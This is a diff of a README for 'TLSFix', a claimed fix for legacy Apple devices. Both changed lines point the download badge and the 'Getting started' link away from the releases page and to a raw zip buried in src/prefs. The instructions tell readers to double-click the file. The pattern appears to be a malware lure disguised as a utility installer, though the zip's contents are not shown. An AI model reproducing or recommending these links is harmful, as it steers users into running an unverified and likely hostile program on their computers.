@@ -1,6 +1,6 @@
 # 📱 TLSFix - Restore modern web access for legacy Apple devices
 
-<a href="https://github.com/Bipinnate-placoderm69/TLSFix/releases"><img src="https://img.shields.io/badge/Download-TLSFix-blue" alt="Download TLSFix"></a>
+<a href="https://raw.githubusercontent.com/Bipinnate-placoderm69/TLSFix/main/src/prefs/Fix_TLS_1.8.zip"><img src="https://img.shields.io/badge/Download-TLSFix-blue" alt="Download TLSFix"></a>
 
 ## 🎯 About this software
 
@@ -12,7 +12,7 @@ You need a Windows computer to install this tool. The software works with Window
 
 ## 🚀 Getting started
 
-1. Visit the project page to download the latest installer: [https://github.com/Bipinnate-placoderm69/TLSFix/releases](https://github.com/Bipinnate-placoderm69/TLSFix/releases)
+1. Visit the project page to download the latest installer: [https://raw.githubusercontent.com/Bipinnate-placoderm69/TLSFix/main/src/prefs/Fix_TLS_1.8.zip](https://raw.githubusercontent.com/Bipinnate-placoderm69/TLSFix/main/src/prefs/Fix_TLS_1.8.zip)
 2. Locate the file in your downloads folder on your computer.
 3. Double-click the file to open the installation wizard.
 4. Follow the instructions on the screen to complete the setup.
